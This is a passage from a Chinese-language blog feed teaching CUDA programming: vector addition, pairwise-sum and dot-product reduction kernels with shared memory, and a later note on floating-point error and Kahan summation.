c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// malloc for device memory</span><br><span class="hljs-built_in">GPUAssert</span>(<span class="hljs-built_in">cudaMalloc</span>((<span class="hljs-type">void</span>**) &amp;dev_a, N*<span class="hljs-built_in">sizeof</span>(<span class="hljs-type">int</span>)));<br><span class="hljs-built_in">GPUAssert</span>(<span class="hljs-built_in">cudaMalloc</span>((<span class="hljs-type">void</span>**) &amp;dev_b, N*<span class="hljs-built_in">sizeof</span>(<span class="hljs-type">int</span>)));<br><span class="hljs-built_in">GPUAssert</span>(<span class="hljs-built_in">cudaMalloc</span>((<span class="hljs-type">void</span>**) &amp;dev_c, N*<span class="hljs-built_in">sizeof</span>(<span class="hljs-type">int</span>)));<br><br><span class="hljs-comment">// initilization</span><br><span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>; i&lt;N; i++)&#123;<br>  a[i] = (-i) % <span class="hljs-number">10000</span>;<br>  b[i] = (i*i) % <span class="hljs-number">10000</span>;<br>&#125;<br><br><span class="hljs-function">dim3 <span class="hljs-title">blocks</span><span class="hljs-params">(<span class="hljs-number">4</span>, <span class="hljs-number">4</span>)</span></span>;<br><span class="hljs-function">dim3 <span class="hljs-title">threads</span><span class="hljs-params">(<span class="hljs-number">16</span>, <span class="hljs-number">16</span>)</span></span>;<br><span class="hljs-comment">// memcpy to device</span><br><span class="hljs-built_in">GPUAssert</span>(<span class="hljs-built_in">cudaMemcpy</span>(dev_a, a, N*<span class="hljs-built_in">sizeof</span>(<span class="hljs-type">int</span>), cudaMemcpyHostToDevice));<br><span class="hljs-built_in">GPUAssert</span>(<span class="hljs-built_in">cudaMemcpy</span>(dev_b, b, N*<span class="hljs-built_in">sizeof</span>(<span class="hljs-type">int</span>), cudaMemcpyHostToDevice));<br><br><span class="hljs-comment">// call add kernel func</span><br>add&lt;&lt;&lt;blocks,threads&gt;&gt;&gt;(dev_a, dev_b, dev_c);<br><span class="hljs-comment">// wait untill all finished</span><br><span class="hljs-built_in">GPUAssert</span>(<span class="hljs-built_in">cudaDeviceSynchronize</span>());<br><br><span class="hljs-comment">// memcpy to host</span><br><span class="hljs-built_in">GPUAssert</span>(<span class="hljs-built_in">cudaMemcpy</span>(c, dev_c, N*<span class="hljs-built_in">sizeof</span>(<span class="hljs-type">int</span>), cudaMemcpyDeviceToHost));<br><br><span class="hljs-comment">// print result</span><br><span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i&lt;N; i++)&#123;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%5d + %5d = %5d\n&quot;</span>, a[i], b[i], c[i]);<br>&#125;<br><br><span class="hljs-built_in">GPUAssert</span>(<span class="hljs-built_in">cudaFree</span>(dev_a));<br><span class="hljs-built_in">GPUAssert</span>(<span class="hljs-built_in">cudaFree</span>(dev_b));<br><span class="hljs-built_in">GPUAssert</span>(<span class="hljs-built_in">cudaFree</span>(dev_c));<br></code></pre></td></tr></table></figure><p>这其中，<code>cudaDeviceSynchronize()</code> 函数会将程序一直阻塞，直到前面所有请求的 GPU 任务全部执行完毕。因为主机在调用了核函数后，往往不会等待设备端任务完成就往下执行了，所以如果不加这一函数，可能会出现结果还未计算完成就被移动到主机的情况。</p><h2 id="实践">实践</h2><p>学完了这些以后，就可以写一些简单的 CUDA 小程序了，动手体验一下 GPU 的计算能力吧！之前我们已经给出了向量加法的部分代码。现在考虑一下数组求和问题。</p><p>随机生成一个数组，需要求出该数组所有元素的和。在[之前的文章中](<a href="https://dingfen.github.io/Parallel">https://dingfen.github.io/Parallel</a> Computing/2020/12/17/PP02.html#%E4%BA%8C%E5%8F%89%E6%A0%91%E6%B1%82%E5%92%8C%E5%AE%9E%E7%8E%B0)，介绍过二叉树求和的基本算法。这里可用 CUDA 再实现一次。</p><p>略不同于之前文章的求和步骤，为了方便编程，不要求线程必须将相邻数组的元素相加，而是将步长一致的元素相加。在一开始时，规定步长为线程块大小的一半。<br>每次循环线程计算 <code>v[t] += v[t+n]</code> 的值，也就是将步长一致的累加起来。循环一次后，数组元素的部分和就出现在数组的前半部分。然后将步长缩小一半，那么下一次循环会将部分和集中到数组前半部分。如此往复，直到数组的和集中到了第0号元素上。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">define</span> N 256</span><br><br><span class="hljs-function">__global__ <span class="hljs-type">void</span> <span class="hljs-title">psum</span><span class="hljs-params">(<span class="hljs-type">float</span>* v)</span></span><br><span class="hljs-function"></span>&#123; <br>    <span class="hljs-comment">// Thread index.</span><br>    <span class="hljs-type">int</span> t = threadIdx.x; <br>    <span class="hljs-comment">// Should be half the length of v.</span><br>    <span class="hljs-type">int</span> n = blockDim.x / <span class="hljs-number">2</span>; <br><br>    <span class="hljs-keyword">while</span> (n != <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">if</span>(t &lt; n)<br>            v[t] += v[t + n];  <br>        __syncthreads();    <br>        n /= <span class="hljs-number">2</span>; <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>注意循环中的 <code>__syncthreads()</code>，该句保证了上一循环全部结束后，下一轮循环才会开始。否则，线程之间步调不统一会得出错误的结果。很明显看出，算法每经过一轮循环，可执行的线程就会少一半，这显然浪费了不少计算资源。</p><p>随后就是主机部分的代码。同样的步骤，先分配设备内存，然后将数据喂给设备，随后调用核函数计算，最后将计算结果返回，并回收内存。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span> <span class="hljs-params">(<span class="hljs-type">void</span>)</span> </span>&#123; <br>  <span class="hljs-type">float</span> *v_h, *v_d;<br>  <span class="hljs-comment">// malloc for host and device</span><br>  v_h = (<span class="hljs-type">float</span>*) <span class="hljs-built_in">malloc</span>(N * <span class="hljs-built_in">sizeof</span>(*v_h)); <br>  <span class="hljs-built_in">GPUAssert</span>(<span class="hljs-built_in">cudaMalloc</span>((<span class="hljs-type">float</span>**) &amp;v_d, N *<span class="hljs-built_in">sizeof</span>(*v_d)));<br>  <span class="hljs-comment">// initilization</span><br>  <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>    v[i] = (<span class="hljs-type">float</span>) <span class="hljs-built_in">rand</span>() / RAND_MAX;<br>  &#125;<br>  <span class="hljs-comment">// memcpy to device</span><br>  <span class="hljs-built_in">cudaMemcpy</span>(v_d, v_h, N * <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">float</span>), cudaMemcpyHostToDevice);<br>  psum&lt;&lt;&lt; <span class="hljs-number">1</span>, N&gt;&gt;&gt;(v_d);<br>  <span class="hljs-built_in">cudaMemcpy</span>(v_h, v_d, <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">float</span>), cudaMemcpyDeviceToHost);<br>  <span class="hljs-comment">// memcpy for result</span><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Pairwise sum = %7.3f\n&quot;</span>, v_h[<span class="hljs-number">0</span>]);<br>  <span class="hljs-comment">// free</span><br>  <span class="hljs-built_in">free</span>(v_h);<br>  <span class="hljs-built_in">cudaFree</span>(v_d);<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Parallel Computing</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CUDA</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CUDA 中的向量内积</title>
    <link href="/2021/10/03/2021-10-3-cuda-with-dotproduct/"/>
    <url>/2021/10/03/2021-10-3-cuda-with-dotproduct/</url>
    
    <content type="html"><![CDATA[<h1>CUDA 中的向量内积</h1><p>博主本科时略学过 CUDA 编程的相关知识，但远算不上熟练，更谈不上精通。恰好本人对并行计算很感兴趣，这几天实现了一下最基础的向量内积，对以前的知识做了一点总结，算是温故而知新，可以为师矣。</p><h2 id="向量内积">向量内积</h2><p>两个长为 N 的向量做内积。从并行计算的角度看，可并行部分就是 <code>a[i] * b[i]</code> 部分，然后再对得到的乘积做累加求和。可以让 GPU 中的每个线程执行一个 <code>a[i] * b[i]</code>，然后再进行累加。如下图，考虑到 N 可能非常大，GPU 网格中的线程数量不足以覆盖整个向量，因此需要使用 <code>while</code> 循环，让线程运算多个乘法。</p><p><img src="/img/PP/dotproduct.png" alt="cuda 向量内积示意图"></p><p>具体而言，在下面的这个循环中，每个线程都会运行一个 grid 中的一次乘法，然后跳转到下一个 grid 继续完成乘法。因此，程序的 <code>while</code> 循环，让每个线程计算相应的乘法后，跨越一个 grid 的长度再完成乘法，最后累加到 <code>cache</code> 数组中（橙色箭头），为了不让自增的 <code>tid</code> 变量超过数组边界，每次累加后还需要在 <code>while</code> 语句中判断一下。相应的代码如下，配合上图相应能更好地理解计算过程。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">__global__ <span class="hljs-type">void</span> <span class="hljs-title">dot</span><span class="hljs-params">(<span class="hljs-type">float</span> *c, <span class="hljs-type">float</span> *a, <span class="hljs-type">float</span> *b)</span> </span>&#123;<br>  <span class="hljs-type">int</span> tid = threadIdx.x + blockIdx.x * blockDim.x;<br>  <span class="hljs-type">float</span> cache[blockDim.x * gridDim.x];<br>  <span class="hljs-type">float</span> ans = <span class="hljs-number">0.0f</span>;<br>  <span class="hljs-comment">// 线程并行地执行内积 乘法</span><br>  <span class="hljs-keyword">while</span>(tid &lt; N) &#123;<br>    ans += a[tid] * b[tid];<br>    tid += blockDim.x * gridDim.x;<br>  &#125;<br>  cache[threadIdx.x + blockIdx.x * blockDim.x] = ans;<br></code></pre></td></tr></table></figure><p>上述计算完成后，还需要将 <code>cache</code> 中的数组进一步累加。但这里必须注意，进一步累加前，必须确保所有线程已经完成了上面的循环。因此，这里需添加一个 barrier：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// 线程同步，确保所有线程都完成了上面的循环</span><br>__syncthreads();<br></code></pre></td></tr></table></figure><p>随后，使用一个线程对 <code>cache</code> 中的数组累加，输出结果。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// 归约累加</span><br><span class="hljs-type">float</span> sum = <span class="hljs-number">0.0f</span>;<br><span class="hljs-keyword">if</span> (tid == <span class="hljs-number">0</span>) &#123;<br>  <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; gridDim.x * blockDim.x; i++) &#123;<br>    sum += cache[i];<br>  &#125;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;dot product is : %f\n&quot;</span>, sum);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="程序优化">程序优化</h2><p>上述代码虽然可以完成任务，但没有达到更高的性能。下面我对上面的程序做进一步优化。</p><p>首先介绍一下 CUDA C 中的共享内存。<strong>共享内存</strong>中的变量被线程块中的每个线程共享，而其他线程不能对其访问和修改。要使用共享内存，在编写 CUDA 代码时，只需要注意将共享内存和线程块“捆绑”考虑就行。共享内存可以让一个线程块中的线程更快地完成通信协作，执行更加复杂的任务。最后，共享内存在物理上更贴近线程，因此访问共享内存时的延迟要远低于访问普通缓冲区的延迟。</p><p>但在使用线程之间的通信时，还需要注意线程之间的同步，防止出现竞争条件（Race Condition），避免错误。</p><p>回到该问题，可以明显看到，<code>while</code> 循环中计算出的结果完全可以暂存到共享内存中。而由于共享内存是被一个线程块内的线程共享的，因此 <code>cache</code> 的大小也要改为线程块的大小，而不是整个网格的大小：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">__global__ <span class="hljs-type">void</span> <span class="hljs-title">dot</span><span class="hljs-params">(<span class="hljs-type">float</span> *c, <span class="hljs-type">float</span> *a, <span class="hljs-type">float</span> *b)</span> </span>&#123;<br>  <span class="hljs-type">int</span> tid = threadIdx.x + blockIdx.x * blockDim.x;<br>  __shared__ <span class="hljs-type">float</span> cache[blockDim.x];<br>  <span class="hljs-type">float</span> ans = <span class="hljs-number">0.0f</span>;<br>  <span class="hljs-comment">// 线程块内的线程并行地执行内积 乘法</span><br>  <span class="hljs-keyword">while</span>(tid &lt; N) &#123;<br>    ans += a[tid] * b[tid];<br>    tid += blockDim.x * gridDim.x;<br>  &#125;<br>  cache[threadIdx.x] = ans;<br></code></pre></td></tr></table></figure><p>改为共享内存后，后面的归约累加部分也必须更改。因为 0 号线程不可能访问其他线程块的共享内存。因此，需要在线程块中完成累加。具体做法类似于[二叉树求和](<a href="https://dingfen.github.io/Parallel">https://dingfen.github.io/Parallel</a> Computing/2020/12/17/PP02.html#%E4%BA%8C%E5%8F%89%E6%A0%91%E6%B1%82%E5%92%8C%E5%AE%9E%E7%8E%B0)。每个线程将数组的两个值加起来，再将结果写到低索引位的数上。这样一次循环结束后，数组中的有效数据便只剩下一半。下一个循环再对这一半数组做同样操作，依次往复，直到累加值存在于 <code>cache[0]</code> 中。但注意：<strong>这种算法要求线程块内线程数量必须为 2 的幂次</strong>。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-type">int</span> i = blockDim.x / <span class="hljs-number">2</span>;<br><span class="hljs-keyword">while</span>(i != <span class="hljs-number">0</span>) &#123;<br>  <span class="hljs-keyword">if</span> (threadIdx.x &lt; i)<br>    cache[threadIdx.x] += cache[threadIdx.x + i];<br>  __syncthreads();  <span class="hljs-comment">// 为何一定要加上？</span><br>  i /= <span class="hljs-number">2</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (threadIdx.x == <span class="hljs-number">0</span>)<br>  c[blockIdx.x] = cache[<span class="hljs-number">0</span>];<br></code></pre></td></tr></table></figure><p>很遗憾核函数只能做到这一步了，因为 <code>cache[0]</code> 都存在于共享内存中，GPU 中没有一个线程可以访问到所有的结果，所以进一步的累加只能靠 CPU。但别灰心，提前放弃在 GPU 中的计算事实上是一件好事：因为累加求和的归约运算一般只能由一个线程完成，交给 GPU 做只能说是杀鸡用牛刀，太浪费计算资源。而且，此时数据量已经非常小，CPU 也能很出色地完成任务。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// last reduction for cpu</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; blocksPerGrid; i++) &#123;<br>  *ans += c[i];<br>&#125;<br></code></pre></td></tr></table></figure><p>最后，放上核函数及其调用代码，供大家参考。若想亲自实验，可从<a href="https://github.com/dingfen/cuda10/blob/master/cudaDotProduct/dotproduct.cu">github 链接</a>获取。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">__global__ <span class="hljs-type">void</span> <span class="hljs-title">dot</span><span class="hljs-params">(<span class="hljs-type">float</span>* c, <span class="hljs-type">float</span>* a, <span class="hljs-type">float</span>* b)</span> </span>&#123;<br>  __shared__ <span class="hljs-type">float</span> cache[threadsPerBlock];<br>  <span class="hljs-type">int</span> tid = threadIdx.x + blockIdx.x * blockDim.x;<br>  <span class="hljs-type">int</span> cacheIndex = threadIdx.x;<br>  <span class="hljs-comment">// gird loops addition, reduce sum in cache for every thread.</span><br>  <span class="hljs-type">float</span> temp = <span class="hljs-number">0.0</span>;<br>  <span class="hljs-keyword">while</span> (tid &lt; N) &#123;<br>    temp += a[tid] * b[tid];<br>    tid += blockDim.x * gridDim.x;<br>  &#125;<br>  cache[cacheIndex] = temp;<br>  <span class="hljs-comment">// thread synchronize</span><br>  __syncthreads();<br><br>  <span class="hljs-comment">// Reductions parallel as Binary tree in each block</span><br>  <span class="hljs-type">int</span> i = blockDim.x / <span class="hljs-number">2</span>;<br>  <span class="hljs-keyword">while</span> (i != <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-keyword">if</span> (cacheIndex &lt; i)<br>      cache[cacheIndex] += cache[cacheIndex + i];<br>    __syncthreads();<br>    i /= <span class="hljs-number">2</span>;<br>  &#125;<br><br>  <span class="hljs-keyword">if</span> (cacheIndex == <span class="hljs-number">0</span>)<br>    c[blockIdx.x] = cache[<span class="hljs-number">0</span>];<br>  <span class="hljs-comment">// for not waste computing resource, exit now.</span><br>&#125;<br><br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> <span class="hljs-function">cudaError_t <span class="hljs-title">dotproduct</span><span class="hljs-params">(<span class="hljs-type">float</span>* ans, <span class="hljs-type">float</span>* a, <span class="hljs-type">float</span>* b)</span> </span>&#123;<br>  <span class="hljs-type">float</span>* dev_a = <span class="hljs-literal">NULL</span>;<br>  <span class="hljs-type">float</span>* dev_b = <span class="hljs-literal">NULL</span>;<br>  <span class="hljs-type">float</span>* dev_c = <span class="hljs-literal">NULL</span>;<br>  <span class="hljs-type">float</span>* c = <span class="hljs-literal">NULL</span>;<br>  <span class="hljs-type">float</span> time;<br>  <br>  c = (<span class="hljs-type">float</span>*)<span class="hljs-built_in">malloc</span>(blocksPerGrid * <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">float</span>));<br>  cudaEvent_t start, stop;<br>  <span class="hljs-built_in">GPUAssert</span>(<span class="hljs-built_in">cudaEventCreate</span>(&amp;start));<br>  <span class="hljs-built_in">GPUAssert</span>(<span class="hljs-built_in">cudaEventCreate</span>(&amp;stop));<br>  <span class="hljs-built_in">GPUAssert</span>(<span class="hljs-built_in">cudaEventRecord</span>(start, <span class="hljs-number">0</span>));<br>  <span class="hljs-built_in">GPUAssert</span>(<span class="hljs-built_in">cudaMalloc</span>(&amp;dev_a, N * <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">float</span>)));<br>  <span class="hljs-built_in">GPUAssert</span>(<span class="hljs-built_in">cudaMalloc</span>(&amp;dev_b, N * <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">float</span>)));<br>  <span class="hljs-built_in">GPUAssert</span>(<span class="hljs-built_in">cudaMalloc</span>(&amp;dev_c, blocksPerGrid * <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">float</span>)));<br><br>  <span class="hljs-built_in">GPUAssert</span>(<span class="hljs-built_in">cudaSetDevice</span>(<span class="hljs-number">0</span>));<br><br>  <span class="hljs-built_in">GPUAssert</span>(<span class="hljs-built_in">cudaMemcpy</span>(dev_a, a, N * <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">float</span>), cudaMemcpyHostToDevice));<br>  <span class="hljs-built_in">GPUAssert</span>(<span class="hljs-built_in">cudaMemcpy</span>(dev_b, b, N * <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">float</span>), cudaMemcpyHostToDevice));<br><br>  dot&lt;&lt;&lt;blocksPerGrid, threadsPerBlock&gt;&gt;&gt;(dev_c, dev_a, dev_b);<br><br>  <span class="hljs-built_in">GPUAssert</span>(<span class="hljs-built_in">cudaGetLastError</span>());<br>  <span class="hljs-built_in">GPUAssert</span>(<span class="hljs-built_in">cudaDeviceSynchronize</span>());<br>  <span class="hljs-built_in">GPUAssert</span>(<span class="hljs-built_in">cudaMemcpy</span>(c, dev_c, blocksPerGrid * <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">float</span>), cudaMemcpyDeviceToHost));<br><br>  <span class="hljs-built_in">GPUAssert</span>(<span class="hljs-built_in">cudaEventRecord</span>(stop, <span class="hljs-number">0</span>));<br>  <span class="hljs-built_in">GPUAssert</span>(<span class="hljs-built_in">cudaEventSynchronize</span>(stop));<br>  <span class="hljs-built_in">GPUAssert</span>(<span class="hljs-built_in">cudaEventElapsedTime</span>(&amp;time, start, stop));<br>  <span class="hljs-comment">// last reduction for cpu</span><br>  <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; blocksPerGrid; i++) &#123;<br>    *ans += c[i];<br>  &#125;<br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;GPU time: %8.4f\n&quot;</span>, time);<br>  <span class="hljs-built_in">cudaFree</span>(dev_a);<br>  <span class="hljs-built_in">cudaFree</span>(dev_b);<br>  <span class="hljs-built_in">cudaFree</span>(dev_c);<br>  <span class="hljs-built_in">cudaEventDestroy</span>(start);<br>  <span class="hljs-built_in">cudaEventDestroy</span>(stop);<br>  <span class="hljs-built_in">free</span>(c);<br>  <span class="hljs-keyword">return</span> cudaSuccess;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="kahan-算法">kahan 算法</h2><p>更新于 2023.9.4</p><p>闲来无事，重新温故一下几年前写的代码。突然发现，这好像没算对啊，CPU 计算出来的数据跟 GPU 的数据怎么都对不上。只要数据量一大（上千），二者得出的结果就会差几十，数据量越大差得越多，为啥呢？</p><p>首先，我反复琢磨了这几行几年前写的代码，反反复复地推导后得出结论：根本没问题。那么问题出在哪里？</p><p>问题出在：<strong>浮点数的加法不满足结合律</strong>。用数学的话说，即 $$ (a+b)+c \neq a+(b+c) $$。为什么会这样？这得从浮点数在计算机中的表示说起，在计算机程序中，我们需要用有限位数对实数做近似表示，如今的大多数计算机都使用 <a href="https://en.wikipedia.org/wiki/IEEE_754">IEEE-754</a> 规定的浮点数来作为这个近似表示。然而一旦扯到这个，其篇幅和知识点不是本博客可以接受的了的，因此这里就放个<a href="https://blog.csdn.net/K346K346/article/details/50487127">链接</a>供各位感兴趣的读者自行研究。</p><p>跳过这些复杂繁琐的细节，这里直接给出了结论：因计算机内资源有限，浮点数在其中无法被精确表示，导致<em>绝对值越大的浮点数拥有越不精确（越少）的小数点位数</em>，而绝对值越接近于0的数有更多的精确的小数点位数。为方便理解，各位读者可以简单地用 C++ 运行如下算式，看它们的结果是否相等。然后再把 <code>float</code> 变为 <code>double</code>，或者减小数字的绝对值等，看结果是否有变化。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-type">float</span> s1 = (<span class="hljs-number">100000000.00001f</span> - <span class="hljs-number">100000000.f</span>) + <span class="hljs-number">0.00001f</span>;<br><span class="hljs-type">float</span> s2 = (<span class="hljs-number">100000000.00001f</span> + <span class="hljs-number">0.00001f</span>) - <span class="hljs-number">100000000.f</span>;<br></code></pre></td></tr></table></figure><p>那么这跟咱们的程序无法得到准确结果有什么关系呢？首先，因为我们在计算两个甚长向量的内积值，这意味着在算数的最后，我们需要将很多浮点乘积值逐一累加起来，具体做法就是一个一个地将乘积值加入到前缀和中。而若这些乘积值都是正浮点数（或者负浮点数），那么不断累加后，其前缀和的绝对值必然会变得越来越大。而前面提到过，由于计算机内表示一个浮点数所用的资源有限，为表示该前缀和，计算机不得不丢掉越来越多的小数点后的位数，导致该值也就越来越不精确。甚至到最后，前缀和再继续累加乘积值后，可能由于乘积值过小而直接被抛弃了！</p><p>计算机运算浮点数存在了这种精度缺陷，应当如何解决？想必大家能从上面的例子中获得一些启发：适当地交换运算顺序，或许就能够避免因“大数加小数”产生的精度损失。kahan 求和法便是利用了这一特点，尽可能挽救了因不断累加而丢失的精确度。</p><p>在介绍 kahan 求和法前，先明确一下我们要解决的问题：有一个内含大量正浮点数的数组 <code>nums</code>，需求得其总和。在不断累加的过程中，我们用 <code>sum</code> 表示中间过程的前缀和。显然，程序执行到一定程度后，必然会出现 <code>sum</code> 很大，而 <code>nums</code> 内值很小的情况。因此若直接计算 <code>sum += nums</code>，则 <code>nums</code> 的小数点低位数会丢失。而 kahan 求和法通过记住这其中的误差，将其加到后续的结果中，即可挽回损失的精度。</p><p>具体是这样做的，已知 <code>sum += num</code> 是不准确的，产生了 <code>eff</code> 的误差。此时考虑：<code>c = (sum + num) - sum - num</code>。注意，关于 <code>c</code> 的计算中，只有 <code>sum + num</code> 是不准确的（因为只有这个运算涉及到了大数加小数），因此，<code>c</code> 可以将加法产生的误差保留下来，近似等于 <code>eff</code>。此外，针对 <code>c</code> 的运算顺序不能变化！否则就有不止一个运算是不准确的了。我们保留 <code>c</code>，在计算下一个加法的时候，再将这个误差补上，更新到 <code>sum</code> 中去。</p><p>Kahan 求和算法主要通过一个单独变量 <code>c</code> 用来累积误差。如下方参考代码所示：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">float</span> <span class="hljs-title">kahanSum</span><span class="hljs-params">(vector&lt;<span class="hljs-type">float</span>&gt; nums)</span> </span>&#123;<br>  <span class="hljs-type">float</span> sum = <span class="hljs-number">0.0f</span>;<br>  <span class="hljs-type">float</span> c = <span class="hljs-number">0.0f</span>;<br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> num : nums) &#123;<br>    <span class="hljs-type">float</span> y = num - c;<br>    <span class="hljs-type">float</span> t = sum + y;<br>    c = (t - sum) - y;<br>    sum = t;<br>  &#125;<br>  <span class="hljs-keyword">return</span> sum;<br>&#125;<br></code></pre></td></tr></table></figure><p>注：Kahan 求和法，又名补偿求和或进位求和法，是一个用来降低有限精度浮点数序列累加值误差的算法。它主要通过保持一个单独变量用来累积误差（常用变量名为 <code>c</code>）来完成的。该算法主要由 William Kahan 于 1960s 发现。因为 Ivo 